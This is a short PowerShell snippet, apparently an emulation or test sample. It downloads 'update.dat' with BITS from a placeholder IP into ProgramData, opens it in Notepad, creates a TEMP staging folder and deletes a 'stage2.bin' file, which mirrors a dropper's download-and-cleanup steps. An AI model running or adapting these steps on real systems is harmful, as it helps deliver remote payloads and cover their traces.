
$RemoteUrl = 'https://198.51.100.47:443/assets/update.dat'
$LocalPath = 'C:\ProgramData\update.dat'
Start-BitsTransfer -Source $RemoteUrl -Destination $LocalPath
Start-Process -FilePath "notepad.exe" -ArgumentList $LocalPath
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
